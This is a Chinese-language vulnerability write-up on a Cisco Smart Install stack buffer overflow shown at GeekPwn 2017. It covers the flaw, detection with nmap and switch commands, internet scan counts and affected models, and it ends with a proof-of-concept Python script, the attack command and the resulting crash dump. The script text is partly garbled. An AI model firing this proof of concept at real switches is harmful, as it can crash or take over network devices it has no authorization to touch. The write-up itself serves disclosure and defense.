**自 2010 年发布以来，思科的Smart Install
出现过若干漏洞，包括远程代码执行漏洞CVE-2011-3271、拒绝服务漏洞CVE-2012-0385、CVE-2013-1146、CVE-2016-1349和CVE-2016-6385。**

2017 年 5 月，Embedi 安全公司研究员、俄罗斯白帽黑客 George Nosenko 在 GeekPwn 黑客大赛现场成功演示了一个思科交换机
Smart Install 的缓冲区堆栈溢出漏洞。赛后主办方向思科提交了漏洞信息，2018年 3 月 28 日思科发布漏洞修复补丁。

## 一、简介

> 系统：Cisco IOS，Cisco IOS-XE
>
> 供应商：[思科]()
>
>
> 漏洞：缓冲区堆栈溢出漏洞[[CWE-20](https://cwe.mitre.org/data/definitions/20.html)][[CWE-21](https://cwe.mitre.org/data/definitions/21.html)]
>
> 危害：高危，AV:N/AC:L/Au:N/C:C/I:C/A:C (10.0)

研究人员在 Smart Install Client
代码中发现一个缓冲区堆栈溢出漏洞。攻击者利用这个漏洞可以不经身份验证远程执行任意代码。也就是说，攻击者能够完全控制受漏洞影响的网络设备。

Smart Install
功能是部署交换机的即插即用配置和镜像管理功能。它自动完成初始化，并为新的网络交换器加载当前操作系统的镜像。这意味着用户能够将一个交换器发送到另一个地址放置在网络中，在无配置和管理员的情况下启动交换机。当设备配置发生变化或者热插拔损坏的设备时，这个技术还为配置提供了备份。

一个使用了 Smart Install 的网络包含了一组网络设备，被称为客户端（client），它们由一个三层交换器或者路由器来提供服务，作为它们的
director。

![图片.png](https://image.3001.net/images/20180329/1522293972459.png!small)  

Director 为客户端交换器提供了一个用于镜像和配置的单点管理。客户端交换器与 director 直接或间接地连接，因此能够收到下载的镜像和配置。

通过[官方文档](https://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html)可以了解更多关于
Smart Install 技术的信息。

值得注意的是，Smart Install 客户端是默认开启的，因此漏洞影响覆盖范围和危害性不言而喻，重点将在后文论述。

## 二、漏洞描述

SMI IBC Server Process 进程中包含了 Smart Install Client的实现代码。Smart Install
Client在TCP（4786）端口上开启服务（默认开启），用来与 Smart Install Director 交互。

当服务处理一段特殊构造的恶意信息 ibd_init_discovery_msg，就发生了缓冲区堆栈溢出。

更具体地说，这个溢出发生在 smi_ibc_handle_ibd_init_discovery_msg，

![图片.png](https://image.3001.net/images/20180329/15222940404693.png!small)

因为没有检查拷贝到固定大小缓冲区的数据尺寸。大小和数据是直接从网络数据包中获得的，并由攻击者控制。

## 三、GeekPwn2017 香港站获奖项目

![george.jpg](https://image.3001.net/images/20180329/15222940914581.jpg!small)  

来自安全公司 Embedi 的白帽黑客George Nosenko 在 GeekPwn2017
黑客大赛香港站使用成功演示了这个漏洞，获得“最佳技术奖”，奖金总计 25 万元。

根据大赛提出的场景要求，选手需要在思科 Catalyst 2960 交换机上完成以下两个挑战：

1、重置或者替换 enable 密码，获得 EXEC 模式权限：

<https://v.qq.com/x/page/z0616f2f7q8.html>

2、劫持交换器与其他设备间的网络流量：

<https://v.qq.com/x/page/y0616rq52ca.html>  

更多技术细节和漏洞利用编写可以从[“How To Cook Cisco”](https://embedi.com/blog/how-cook-cisco/)一文中了解。

## 四、漏洞检测

如果你的思科网络设备有一个开放的 TCP 4786 端口，那么它会受到漏洞影响。你可以通过扫描找到这样的设备：

    
    
    nmap -pT:4786 192.168.1.0/24

检测网络设备是否有 Smart Install Client 功能，可以尝试执行以下命令：

    
    
    switch>showvstack config
    Role:Client (SmartInstall enabled)
    VstackDirector IP address: 0.0.0.0
    switch>showtcp brief all
    TCBLocal Address Foreign Address (state)
    0344B794*.4786 *.* LISTEN
    0350A018*.443 *.* LISTEN
    03293634*.443 *.* LISTEN
    03292D9C*.80 *.* LISTEN
    03292504*.80 *.* LISTEN  
    

## 五、互联网扫描结果

当在我们发现这个漏洞，认为它只能被用于企业内部攻击。因为安全配置的网络中 Smart Install 技术是不能通过互联网访问的。

但是通过网络扫描之后，我们发现情况并不是这样子的。

在短暂的网络扫描之后，我们立刻发现了大约250000 有漏洞的设备以及 850 万漏洞端口开放的设备。

或许这是由于 Smart Install 客户端端口 TCP（4786）默认开放，而且网络管理员并没有意识到其中可能存在的安全问题。

## 六、受漏洞影响的软硬件

![图片.png](https://image.3001.net/images/20180329/15222969428444.png!small)  

经验证存在漏洞的设备包括：Catalyst 4500Supervisor Engines、Cisco Catalyst 3850
SeriesSwitches 和 CiscoCatalyst 2960 Series Switches。

> Cisco Catalyst 4500 SupervisorEngine 6L-E
>
> Cisco IOS 15.2.2E6 (Latest,Suggested)
>
> cat4500e-entservicesk9-mz.152-2.E6.bin(23-DEC-2016)
>
> Cisco Catalyst 2960-48TT-L Switch
>
> Cisco IOS 12.2(55)SE11 (Suggested)
>
> c2960-lanbasek9-mz.122-55.SE11.bin(18-AUG-2016)
>
> Cisco IOS 15.0.2-SE10a (Latest)
>
> c2960-lanbasek9-mz.150-2.SE10a.bin(10-NOV-2016)
>
> Cisco Catalyst 3850-24P-E Switch
>
> Cisco IOS-XE 03.03.05.SE
>
> cat3k_caa-universalk9.SPA.03.03.05.SE.150-1.EZ5.bin(03-NOV-2014)

此外，所有具备 Smart Install Client 的设备都可能受到漏洞影响，包括下列：

> Catalyst 4500 Supervisor Engines
>
> Catalyst 3850 Series
>
> Catalyst 3750 Series
>
> Catalyst 3650 Series
>
> Catalyst 3560 Series
>
> Catalyst 2960 Series
>
> Catalyst 2975 Series
>
> IE 2000
>
> IE 3000
>
> IE 3010
>
> IE 4000
>
> IE 4010
>
> IE 5000
>
> SM-ES2 SKUs
>
> SM-ES3 SKUs
>
> NME-16ES-1G-P
>
> SM-X-ES3 SKUs

更多信息，可以查询：

[CiscoSecurity
Advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2#fixed)

[Cisco Feature
Navigator](http://cfn.cloudapps.cisco.com/ITDIT/CFN/jsp/index.jsp)

[Supported Devices for Smart
Install](http://cfn.cloudapps.cisco.com/ITDIT/CFN/jsp/index.jsp)

## 七、POC

    
    
    #smi_ibc_init_discovery_BoF.py
    importsocket
    importstruct
    fromoptparse import OptionParser
    # Parsethe target options
    parser =OptionParser()
    parser.add_option("-t","--target", dest="target", help="Smart InstallClient", de
    fault="192.168.1.1")parser.add_option("-p", "--port", dest="port",type="int", h
    elp="Portof Client", default=4786) (options, args) = parser.parse_args()
    defcraft_tlv(t, v, t_fmt='!I', l_fmt='!I'):
    return struct.pack(t_fmt,t) + struct.pack(l_fmt, len(v)) + v
    defsend_packet(sock, packet):
    sock.send(packet)
    defreceive(sock):
    returnsock.recv()
    if__name__ == "__main__":
    print"[*] Connecting to Smart Install Client ", options.target,"port", optio
    ns.port
    con =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect((options.target,options.port))
    payload= 'BBBB' * 44 shellcode = 'D' * 2048
    data ='A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payl
    oad
    tlv_1 =craft_tlv(0x00000001, data) tlv_2 = shellcode
    pkt =hdr + tlv_1 + tlv_2
    print"[*] Send a malicious packet" send_packet(con, pkt)  
    

攻击命令：

    
    
    host$./smi_ibc_init_discovery_BoF.py -t 192.168.1.1

交换机应当报错并重启：

    
    
    0
    -Traceback=42424240
    Writingcrashinfo to flash:/crashinfo_ext/crashinfo_ext_15
    ===Flushing messages (00:10:39 UTC Mon Mar 1 1993) === Buffered messages:
    ...
    Queuedmessages:
    CiscoIOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE11, RELE
    ASESOFTWARE
    (fc3)
    TechnicalSupport: http://www.cisco.com/techsupport
    Copyright(c) 1986-2016 by Cisco Systems, Inc.
    CompiledWed 17-Aug-16 13:46 by prod_rel_team
    InstructionTLB Miss Exception (0x1200)!
    SRR0 =0x42424240 SRR1 = 0x00029230 SRR2 = 0x0152ACE4 SRR3 = 0x00029230
    ESR =0x00000000 DEAR = 0x00000000 TSR = 0x84000000 DBSR = 0x00000000
    CPURegister Context:
    Vector =0x00001200 PC = 0x42424240 MSR = 0x00029230 CR = 0x33000053
    LR =0x42424242 CTR = 0x014D5268 XER = 0xC000006A
    R0 =0x42424242 R1 = 0x02B1B0B0 R2 = 0x00000000 R3 = 0x032D12B4
    R4 =0x000000B6 R5 = 0x0000001E R6 = 0xAA3BEC00 R7 = 0x00000014
    R8 =0x0000001E R9 = 0x00000000 R10 = 0x001BA800 R11 = 0xFFFFFFFF
    R12 =0x00000000 R13 = 0x00110000 R14 = 0x0131E1A8 R15 = 0x02B1B1A8
    R16 =0x02B1B128 R17 = 0x00000000 R18 = 0x00000000 R19 = 0x02B1B128
    R20 =0x02B1B128 R21 = 0x00000001 R22 = 0x02B1B128 R23 = 0x02B1B1A8
    R24 =0x00000001 R25 = 0x00000000 R26 = 0x42424242 R27 = 0x42424242
    R28 =0x42424242 R29 = 0x42424242 R30 = 0x42424242 R31 = 0x42424242
    Stacktrace:
    PC =0x42424240, SP = 0x02B1B0B0
    Frame00: SP = 0x42424242 PC = 0x42424242  
    

## 八、极棒比赛现场视频

 ***英文版发布于[ Embedi 博客](https://embedi.com/blog/cisco-smart-install-remote-code-execution/)**  

